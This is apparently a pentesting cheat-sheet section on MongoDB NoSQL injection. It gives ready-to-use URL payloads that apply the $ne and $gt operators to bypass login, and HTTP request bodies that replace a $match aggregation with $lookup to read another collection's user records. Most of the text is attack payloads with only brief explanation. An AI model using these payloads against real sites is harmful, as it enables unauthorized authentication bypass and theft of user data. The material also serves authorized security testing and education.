## Manual Injection

### MongoDB

If the web application uses MongDB, you might be able to fetch the user's information.  
It allows you to bypass authentication.

```sh
https://vulnerable.com/search?username=admin&password[$ne]=xyz
https://vulnerable.com/search?username[$ne]=admin&role=guest
https://vulnerable.com/search?id[$gt]=1&username=mike
```

<br />

## Retrieve Another Document (MongoDB)

If the website uses **MongoDB** and uses **`$match`** aggregation to fetch documents, we can change the aggregation to **`$lookup`** for joining another document and get desired information from the document.  
First, check if the **`$match`** operator is used in the website.

```bash
POST /products HTTP/1.1
...

{
    "$match": {
        "sold": false
    }
}
```

As above, the website uses **`$match`** aggregator to fetch data from the **"products"** document, so we can change this as the following.  
Assume both the **"products"** and **"users"** document have an **"id"** field.

```bash
POST /users HTTP/1.1
...

{
    "$lookup": {
        "from": "users",
        "localField": "id",
        "foreignField": "id",
        "as": "test"
    }
}
```

Then send this request. We can retrieve values in the **"users"** document.
